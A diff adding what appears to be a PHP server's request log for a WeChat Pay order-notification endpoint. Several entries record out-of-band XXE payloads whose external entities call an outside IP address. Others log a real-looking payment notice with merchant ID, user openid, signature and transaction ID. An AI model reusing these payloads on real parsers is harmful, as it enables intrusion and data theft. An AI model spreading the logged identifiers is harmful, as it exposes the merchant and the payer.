@@ -1,0 +1,78 @@
+03:14:35|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019072103_283?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
+%xxe;
+]>'
+| GET:array (
+)
+03:14:35|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019072103_283?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
+<foo><value>&xxe;</value></foo>'
+| GET:array (
+)
+03:24:11|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019072103_283?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
+%xxe;
+]>'
+| GET:array (
+)
+03:24:12|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019072103_283?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
+<foo><value>&xxe;</value></foo>'
+| GET:array (
+)
+03:31:50|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019072103_283?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
+%xxe;
+]>'
+| GET:array (
+)
+03:31:50|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019072103_283?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
+<foo><value>&xxe;</value></foo>'
+| GET:array (
+)
+23:48:28|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
+<bank_type><![CDATA[HXB_CREDIT]]></bank_type>
+<cash_fee><![CDATA[1]]></cash_fee>
+<fee_type><![CDATA[CNY]]></fee_type>
+<is_subscribe><![CDATA[N]]></is_subscribe>
+<mch_id><![CDATA[1543596541]]></mch_id>
+<nonce_str><![CDATA[5d348944ab4d3]]></nonce_str>
+<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
+<out_trade_no><![CDATA[247061694424608201301]]></out_trade_no>
+<result_code><![CDATA[SUCCESS]]></result_code>
+<return_code><![CDATA[SUCCESS]]></return_code>
+<sign><![CDATA[A2520025CAE01C205ACCB13F64E2D160]]></sign>
+<time_end><![CDATA[20190721234827]]></time_end>
+<total_fee>1</total_fee>
+<trade_type><![CDATA[JSAPI]]></trade_type>
+<transaction_id><![CDATA[4200000358201907211262283598]]></transaction_id>
+</xml>'
+| GET:array (
+)
+23:48:28|notify  array (
+  'appid' => 'wx6be14b9c1bbe7bc0',
+  'bank_type' => 'HXB_CREDIT',
+  'cash_fee' => '1',
+  'fee_type' => 'CNY',
+  'is_subscribe' => 'N',
+  'mch_id' => '1543596541',
+  'nonce_str' => '5d348944ab4d3',
+  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
+  'out_trade_no' => '247061694424608201301',
+  'result_code' => 'SUCCESS',
+  'return_code' => 'SUCCESS',
+  'sign' => 'A2520025CAE01C205ACCB13F64E2D160',
+  'time_end' => '20190721234827',
+  'total_fee' => '1',
+  'trade_type' => 'JSAPI',
+  'transaction_id' => '4200000358201907211262283598',
+)
+| GET:array (
+)
